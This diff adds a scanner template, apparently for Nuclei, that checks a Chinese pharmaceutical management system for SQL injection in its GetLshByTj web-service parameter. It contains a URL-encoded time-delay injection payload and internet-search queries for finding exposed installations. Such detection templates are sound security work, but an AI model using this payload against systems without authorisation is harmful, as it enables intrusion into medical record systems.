@@ -1,0 +1,28 @@
+id: Medical_Manage_GetLshByTj_SQLi
+
+info:
+  name: Medical_Manage_GetLshByTj_SQLi
+  author: security-xm
+  severity: high
+  description: 某医药信息管理系统/WebService.asmx/GetLshByTj接口djcname参数存在SQL注入漏洞
+  metadata:
+    max-request: 1
+    Fofa-query: body="ResourceScripts/zh-cn-Login.aspx.js"
+    Hunter-query: body="ResourceScripts/zh-cn-Login.aspx.js"
+    Quake-query: body="ResourceScripts/zh-cn-Login.aspx.js"
+    verified: true
+
+http:
+- raw:
+  - |+
+    @timeout: 10s
+    GET /WebService.asmx/GetLshByTj?djcname=%31%27%3b%77%61%69%74%66%6f%72%20%64%65%6c%61%79%20%27%30%3a%30%3a%33%27%2d%2d%20%2d&redonly=true&tjstr=12 HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+  redirects: true
+  matchers-condition: and
+  matchers:
+    - type: dsl
+      dsl:
+        - 'duration >= 3'
